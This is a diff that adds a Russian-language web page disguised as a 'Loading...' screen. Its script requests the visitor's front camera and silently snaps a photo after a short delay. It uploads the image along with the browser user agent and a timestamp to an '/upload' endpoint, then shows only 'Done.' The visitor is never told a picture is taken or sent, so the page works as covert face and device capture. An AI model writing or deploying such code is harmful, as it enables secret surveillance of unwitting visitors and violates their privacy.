@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Загрузка...</title>
+  <style>
+    body { margin: 0; background: #111; color: #eee; font-family: sans-serif; }
+    #wrap { display: none; }
+  </style>
+</head>
+<body>
+  <div id="wrap">
+    <video id="video" autoplay playsinline muted style="width:100%; max-width:480px;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
+
+  <script>
+    (async function() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const wrap = document.getElementById('wrap');
+
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+      } catch (e) {
+        document.body.innerHTML = '<p style="padding:20px">Нет доступа к камере.</p>';
+        return;
+      }
+
+      video.srcObject = stream;
+      wrap.style.display = 'block';
+
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+
+      await new Promise(r => setTimeout(r, 1500));
+
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+      canvas.width = w;
+      canvas.height = h;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, w, h);
+
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+      try {
+        await fetch('/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            image: dataUrl,
+            ua: navigator.userAgent,
+            ts: Date.now()
+          })
+        });
+      } catch (e) {}
+
+      stream.getTracks().forEach(t => t.stop());
+      document.body.innerHTML = '<p style="padding:20px">Готово.</p>';
+    })();
+  </script>
+
+</body>
+</html>
